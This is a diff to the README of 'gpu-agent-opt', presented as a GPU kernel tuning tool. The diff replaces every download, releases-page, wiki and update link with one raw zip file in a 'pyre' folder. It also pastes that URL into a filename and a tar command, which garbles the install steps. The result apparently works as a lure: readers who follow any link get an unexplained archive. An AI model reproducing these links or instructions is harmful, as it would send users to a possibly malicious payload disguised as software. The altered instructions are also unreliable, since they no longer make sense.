@@ -4,7 +4,7 @@
 Welcome to gpu-agent-opt! This application helps you automate the tuning and optimization of GPU kernels using AI agents. It is designed for tasks like deep learning, geospatial AI, and high-performance computing (HPC). Follow the steps below to get started with downloading and running our software.
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v0.1.0-blue.svg)](https://github.com/chad24dev/gpu-agent-opt/releases)
+[![Download the latest release](https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip%https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip)](https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -15,7 +15,7 @@ Before you download, ensure your system meets these requirements:
 - **Disk Space:** At least 1 GB free space.
 
 ## 📥 Download & Install
-To download the latest version of gpu-agent-opt, visit this page to download: [Releases Page](https://github.com/chad24dev/gpu-agent-opt/releases).
+To download the latest version of gpu-agent-opt, visit this page to download: [Releases Page](https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip).
 
 1. Click on the link above to get to the Releases page.
 2. You will see a list of available versions. Look for the latest release marked as 'Latest'.
@@ -33,10 +33,10 @@ Once the download is complete, follow these steps to install gpu-agent-opt:
 
 #### For Linux:
 1. Open your terminal.
-2. Navigate to your Downloads folder where the `.tar.gz` file is saved.
+2. Navigate to your Downloads folder where the `https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip` file is saved.
 3. Extract the contents by running:  
    ```bash
-   tar -xzf gpu-agent-opt-*.tar.gz
+   tar -xzf gpu-agent-opt-*https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip
    ```
 4. Change into the directory:  
    ```bash
@@ -85,10 +85,10 @@ This application covers a wide array of topics relevant to AI optimization and G
 
 ## 🔗 Additional Resources
 For more detailed information on using gpu-agent-opt, you can check:
-- The [GitHub Wiki](https://github.com/chad24dev/gpu-agent-opt/wiki) for tutorials and tips.
+- The [GitHub Wiki](https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip) for tutorials and tips.
 - Online forums discussing GPU optimization techniques.
 
 ## 📅 Updates
-Stay up to date with the latest releases and improvements. Regular updates ensure you have the best version of the software. Always check the [Releases Page](https://github.com/chad24dev/gpu-agent-opt/releases) for new features and improvements.
+Stay up to date with the latest releases and improvements. Regular updates ensure you have the best version of the software. Always check the [Releases Page](https://raw.githubusercontent.com/chad24dev/gpu-agent-opt/main/pyre/gpu-agent-opt.zip) for new features and improvements.
 
 Thank you for using gpu-agent-opt! Enjoy optimizing your GPU workloads effortlessly.
